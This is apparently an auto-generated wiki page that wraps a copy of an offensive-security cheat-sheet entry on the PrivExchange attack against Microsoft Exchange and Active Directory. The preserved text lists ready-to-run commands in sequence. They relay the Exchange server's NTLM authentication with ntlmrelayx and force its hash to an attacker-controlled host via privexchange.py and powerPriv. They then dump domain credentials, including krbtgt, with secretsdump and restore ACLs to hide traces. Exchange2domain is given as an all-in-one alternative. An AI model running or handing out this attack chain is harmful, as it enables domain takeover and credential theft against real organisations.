---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# PrivExchange

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-cve-privexchange` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/PrivExchange.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [PrivExchange](../../topics/active-directory/privexchange.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-cve-privexchange |
| name | PrivExchange |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/CVE/PrivExchange.md |

## Preserved Source Material

````yaml
_body: "# PrivExchange\n\nExchange your privileges for Domain Admin privs by abusing Exchange.\n:warning: You need a shell\
  \ on a user account with a mailbox.\n\n1. Exchange server hostname or IP address\n\n    ```bash\n    pth-net rpc group members\
  \ \"Exchange Servers\" -I dc01.domain.local -U domain/username\n    ```\n\n2. Relay of the Exchange server authentication\
  \ and privilege escalation (using ntlmrelayx from Impacket).\n\n    ```powershell\n    ntlmrelayx.py -t ldap://dc01.domain.local\
  \ --escalate-user username\n    ```\n\n3. Subscription to the push notification feature (using privexchange.py or powerPriv),\
  \ uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send\
  \ back its NTLMv2 hash to a controlled machine.\n\n    ```bash\n    # https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py\n\
  \    python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx\n    python privexchange.py -ah 10.0.0.2 mail01.domain.local -d\
  \ domain.local -u user_exchange -p pass_exchange\n    \n    # https://github.com/G0ldenGunSec/PowerPriv \n    powerPriv\
  \ -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016\n    ```\n\n4. Profit using secretdumps from Impacket,\
  \ the user can now perform a dcsync and get another user's NTLM hash\n\n    ```bash\n    python secretsdump.py xxxxxxxxxx\
  \ -just-dc\n    python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm\n    ```\n\n5. Clean your mess\
  \ and restore a previous state of the user's ACL\n\n    ```powershell\n    python aclpwn.py --restore ../aclpwn-20190319-125741.restore\n\
  \    ```\n\nAlternatively you can use the Metasploit module\n\n[`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)\n\
  \nAlternatively you can use an all-in-one tool : Exchange2domain.\n\n```powershell\ngit clone github.com/Ridter/Exchange2domain\
  \ \npython Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip\npython\
  \ Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip\n```\n\
  \n## References\n\n* [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)\n\
  * [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)\n* [[PrivExchange]\
  \ From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)\n\
  * [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)"
_relative_path: active-directory/CVE/PrivExchange.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/PrivExchange.md
````
